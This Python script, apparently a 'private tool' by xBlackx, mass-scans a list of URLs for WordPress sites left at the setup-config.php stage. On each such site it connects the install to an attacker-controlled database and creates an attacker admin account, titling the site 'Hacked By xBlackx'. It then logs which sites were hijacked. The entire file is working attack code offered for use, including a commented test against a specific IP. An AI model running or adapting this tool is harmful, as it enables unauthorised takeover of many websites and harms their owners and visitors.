#!/usr/bin/python
# -*- coding: utf-8 -*-
#Recoding Doesn't Make You Programmer :)
#============== Moudles ===============#
import os
os.system('pip install requests')

import time
import json
import string
import random
import requests
import threading
import configparser
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#Install Requirements
try:
	import colorama
	import requests
	import termcolor
	from termcolor import colored
except:
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('pip install termcolor')

config = configparser.ConfigParser()
config.read('Config.ini')
DBNAME = config['SETTING']['DB_NAME']
DBHOST = config['SETTING']['DB_HOST']
DBUSER = config['SETTING']['DB_USER']
DBPASS = config['SETTING']['DB_PASS']
#============== Moudles ===============#
colorama.init()

def UrlToDom(site):
	if(site.startswith("http://")) :
		site = site.replace("http://", "")
	elif(site.startswith("https://")) :
		site = site.replace("https://", "")
	if('www.' in site) :
		site = site.replace("www.", "")
	if('/' in site):
		site = site.rstrip()
		site = site.split('/')[0]
	return site

def ascii():
	os.system('cls' if os.name == 'nt' else 'clear')
	"""Prints the ascii logo"""
	print(colored("""
		 ******    **                   **            
		/*////**  /**                  /**            
 **   **/*   /**  /**  ******    ***** /**  ** **   **
//** ** /******   /** //////**  **///**/** ** //** ** 
 //***  /*//// ** /**  ******* /**  // /****   //***  
  **/** /*    /** /** **////** /**   **/**/**   **/** 
 ** //**/*******  ***//********//***** /**//** ** //**
//   // ///////  ///  ////////  /////  //  // //   // 

By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder""",color = 'magenta'))

def WordPress(Site):
	#url = UrlToDom(Site)
	url = Site
	xCurl = requests.session()
	headers = {
		'Origin': url.split("/")[0],
		'Referer': url,
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Language': 'en-US,en;q=0.9',
		'Upgrade-Insecure-Requests': '1',
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.1.2222.33 Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br",
		"Connection": "keep-alive"
	}
	try:
		IsValid = xCurl.get(url+"/wp-admin/setup-config.php", headers=headers, verify=False, timeout=200, allow_redirects=True)
		if 'WordPress &rsaquo; Setup Configuration File' not in str(IsValid.content):
			print(colored(f"[+] WordPress Config Not Found! ==> {url}",color="red"))
			pass
		else:
			print(colored(f"[+] WordPress Config Found! ==> {url}",color="green"))
			sleep(0.5) 
			fileWP = open("WP_INSTALL.txt", "a+")
			fileWP.writelines(f'{url+"/wp-admin/setup-config.php"}\n')
			fileWP.close()
			PREFIX = 'wp_'+ ''.join(random.choices(string.ascii_lowercase, k = 8))	
			payload =  {'dbname':DBNAME,'uname':DBUSER,'pwd':DBPASS,'dbhost':DBHOST,'prefix':PREFIX,'language':'','submit':'Submit'}
			insta = xCurl.post(url+"/wp-admin/setup-config.php?step=2",data=payload, headers=headers, verify=False, timeout=200, allow_redirects=True)
			if 'All right, sparky' in insta.text:
				isInstalled = xCurl.get(url+"/wp-admin/install.php",headers=headers,verify=False, timeout=200, allow_redirects=True)
				if 'Already Installed' in isInstalled.text:
					file = open("Already_Installed.txt", "a+")
					file.writelines(f'{url}\n')
					file.close()
					print(colored(f"[+] WordPress InJected Already! ==> {url}",color="green"))
					pass
				else:
					payload2 = {'weblog_title':'Hacked By xBlackx|Just For Fun xD','user_name':config['DEFAULT']['LOGIN'],'admin_password':config['DEFAULT']['PASSW'],'admin_password2':config['DEFAULT']['PASSW'],'admin_email':config["DEFAULT"]["EMAIL"],'Submit':'Install+WordPress','language':''}

					resp = xCurl.post(url+"/wp-admin/install.php?step=2",data=payload2,headers=headers,verify=False, timeout=200, allow_redirects=True)
					if 'Success' in resp.text:
						file1 = open("Hacked.txt", "a+")
						file1.writelines(f'{url}\n')
						file1.close()
						print(colored(f"[+] WordPress Website Hacked SuccessFully ! ==> {url}",color="green"))
					else:
						filed = open("Not_Hacked.txt", "a+")
						filed.writelines(f'{url}\n')
						filed.close()
						print(colored(f"[+] WordPress Website Failed To Post InJect ! ==> {url}",color="green"))
			elif 'Unable to write to wp-config.php file.' in insta.text:
				fileE = open("WP_UNWRITABLE.txt", "a+")
				fileE.writelines(f'{url}\n')
				fileE.close()
				print(colored(f"[+] WordPress Unwritable! ==> {url}",color="green"))
			elif 'Error establishing a database connection' in insta.text:
				fileD = open("WP_ERROR.txt", "a+")
				fileD.writelines(f'{url}\n')
				fileD.close()
				print(colored(f"[+] WordPress Database Error! ==> {url}",color="green"))
			elif 'Already Exisit' in insta.text:
				file2 = open("WordPress_Failed.txt", "a+")
				file2.writelines(f'{url}\n')
				file2.close()
				print(colored(f'[-] WordPress Failed To Install DB Error: Already Exisit ==> {url}', color="magenta"))
			else:
				file3 = open("Not_Vuln.txt", "a+")
				file3.writelines(f'{url}\n')
				file3.close()
				print(colored(f'[-] Not Vuln Failed To Install DB ==> {url}', color="blue"))
	except Exception as e:
		#print(e)
		pass

#WordPress('http://18.223.21.226')

def main():
	ascii()
	print()
	print(colored(f"[+] Starting The Tool WordPress Expolit",color = 'red'))
	print(colored(f"[-] Private Tool Created By xBlackx", color="blue"))
	print()
	File = input(f"[+] Enter Your Urls File: ")
	Threads = input(f"[+] Enter Threads: ")
	argFile = open(File,'r', encoding='utf-8').read().splitlines()
	threads = []
	with ThreadPoolExecutor(max_workers=int(Threads)) as executor:
		for data in argFile:
			if 'http' not in data:
				fk = "http://"+data
				threads.append(executor.submit(WordPress, fk))
			else:
				threads.append(executor.submit(WordPress, data))

#Work Done Here!
if __name__ == '__main__':
	main()